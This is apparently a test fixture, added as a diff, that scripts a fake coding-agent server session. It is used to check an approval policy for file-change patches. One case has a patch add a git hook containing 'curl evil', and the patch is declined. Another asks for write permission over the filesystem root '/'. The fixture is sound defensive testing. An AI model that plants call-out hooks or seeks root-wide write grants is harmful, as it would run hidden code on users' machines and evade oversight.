@@ -1,0 +1,24 @@
+// A fix session's file changes: the item announces the paths, the approval
+// that follows names only the item, and the policy judges the paths.
+{"$expect":"initialize"}
+{"$reply":{"userAgent":"codex/0.154.0 (fake)","codexHome":"/tmp/.codex","platformOs":"macos"}}
+{"$expect":"thread/start"}
+{"$reply":{"thread":{"id":"th-4","sessionId":"th-4","cwd":"/work"},"model":"gpt-5-codex","approvalPolicy":"untrusted"}}
+{"$expect":"turn/start"}
+{"$reply":{"turn":{"id":"tn-4","items":[],"status":"inProgress"}}}
+// A patch to the workspace's own source: what a fix is for.
+{"jsonrpc":"2.0","method":"item/started","params":{"item":{"type":"fileChange","id":"fc_ok","status":"inProgress","changes":[{"path":"internal/svc/handler.go","kind":{"type":"update","move_path":null},"diff":"@@ -1 +1 @@\n-a\n+b\n"}]},"threadId":"th-4","turnId":"tn-4"}}
+{"$expect_request":"item/fileChange/requestApproval","id":401,"params":{"threadId":"th-4","turnId":"tn-4","itemId":"fc_ok","startedAtMs":1789039390000,"reason":"apply the fix"}}
+{"jsonrpc":"2.0","method":"item/completed","params":{"item":{"type":"fileChange","id":"fc_ok","status":"completed","changes":[{"path":"internal/svc/handler.go","kind":{"type":"update","move_path":null},"diff":""}]},"threadId":"th-4","turnId":"tn-4"}}
+// A patch that also writes a git hook. The source file in it is fine; the
+// hook is code the next commit runs, so the whole patch is refused.
+{"jsonrpc":"2.0","method":"item/started","params":{"item":{"type":"fileChange","id":"fc_bad","status":"inProgress","changes":[{"path":"internal/svc/handler.go","kind":{"type":"update","move_path":null},"diff":""},{"path":".git/hooks/x","kind":{"type":"add"},"diff":"+curl evil"}]},"threadId":"th-4","turnId":"tn-4"}}
+{"$expect_request":"item/fileChange/requestApproval","id":402,"params":{"threadId":"th-4","turnId":"tn-4","itemId":"fc_bad","startedAtMs":1789039391000}}
+{"jsonrpc":"2.0","method":"item/completed","params":{"item":{"type":"fileChange","id":"fc_bad","status":"declined","changes":[{"path":".git/hooks/x","kind":{"type":"add"},"diff":""}]},"threadId":"th-4","turnId":"tn-4"}}
+// An approval for an item nobody saw start: there are no paths to check.
+{"$expect_request":"item/fileChange/requestApproval","id":403,"params":{"threadId":"th-4","turnId":"tn-4","itemId":"fc_gone","startedAtMs":1789039392000}}
+// A standing permission to write under a root, rather than one patch.
+{"jsonrpc":"2.0","method":"item/started","params":{"item":{"type":"fileChange","id":"fc_root","status":"inProgress","changes":[{"path":"internal/svc/handler.go","kind":{"type":"update","move_path":null},"diff":""}]},"threadId":"th-4","turnId":"tn-4"}}
+{"$expect_request":"item/fileChange/requestApproval","id":404,"params":{"threadId":"th-4","turnId":"tn-4","itemId":"fc_root","startedAtMs":1789039393000,"grantRoot":"/"}}
+{"jsonrpc":"2.0","method":"item/completed","params":{"item":{"type":"agentMessage","id":"msg_1","text":"{\"done\":true}","phase":"final_answer"},"threadId":"th-4","turnId":"tn-4"}}
+{"jsonrpc":"2.0","method":"turn/completed","params":{"threadId":"th-4","turn":{"id":"tn-4","status":"completed","error":null,"items":[],"completedAt":1789039400,"durationMs":900}}}
